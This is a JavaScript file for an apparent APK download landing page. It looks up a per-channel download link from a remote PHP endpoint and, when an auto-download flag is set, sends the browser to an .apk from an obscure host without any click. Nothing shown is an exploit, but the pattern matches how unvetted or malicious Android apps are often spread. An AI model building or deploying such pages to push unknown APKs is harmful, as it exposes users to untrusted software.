var g_apkexist = false;
var g_loop = 0;

//load config
var g_config = null

function isios()
{
    var userAgent = navigator.userAgent;
    if ( userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod') )
    {
        return true;
    }
    return false;

}
function clickdw() {
    this.count = 0;
    var code = getQueryVariable("code");
    var pcurl = g_config["pcurl"] == "" ? "" : g_config["pcurl"];
    if ( (pcurl != "") && isios() )
    {
        window.location.href = pcurl;
        return;
    }

    if (code == "")
    {
        if( g_config["isfixed"] == 1 )
        {
            window.location.href = g_config["apk"] + ".apk";
        }
        else
        {
            window.location.href = "https://wower.woeisueoser.com/" + g_config["apk"] + ".apk";
        }
    }
    else
    {
        if (g_loop > 0) {
            return;
        }
        dwapk();
    }
}

function dwapk()
{
    g_loop++;
    if (!g_apkexist && g_loop < 20)
    {
        sleep(dwapk, 200);
        return;
    }
    g_loop = 0;
    //main apk
    if ( !g_apkexist )
    {
        if( g_config["isfixed"] == 1 )
        {
            window.location.href = g_config["apk"] + ".apk";
        }
        else
        {
            window.location.href = g_config["apk"] + ".apk";
        }
        return;
    }
    var code = getQueryVariable("code");
    var code = code.replace("code_", "");
    window.location.href = g_config["url"];
}

function sleep(callback, time) {
    if (typeof callback == "function") {
        setTimeout(callback, time);
    }
}

window.onload = function() {
    $.getJSON("config.json", function(e) {
        g_config = e;
        var code = getQueryVariable("code");
        if (code != "")
        {
            code = code.replace("code_", "");
            src = "https://weurl1.getsover.com:9009/apk2.php?channelid=" + g_config["channelid"] + "&code=" + code+ "&apk=" + g_config["apk"];
            $.get(src, function(data) {
                g_apkexist = true;
                var d = JSON.parse(data);
        		g_config["url"] = d["dl"];
                if( g_config["autodl"] == 1 )
                {
                    window.location.href = g_config["url"];
                }
            });
        }
    });
}

function getQueryVariable(variable) {
    var query = window.location.search.substring(1);
    var vars = query.split("&");
    var params = "";
    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split("=");
        var numChars = 9;
        var result = pair.slice(-numChars);
        if (pair[0] == variable) {
            params = pair[1];
        }
    }
    return params;
}
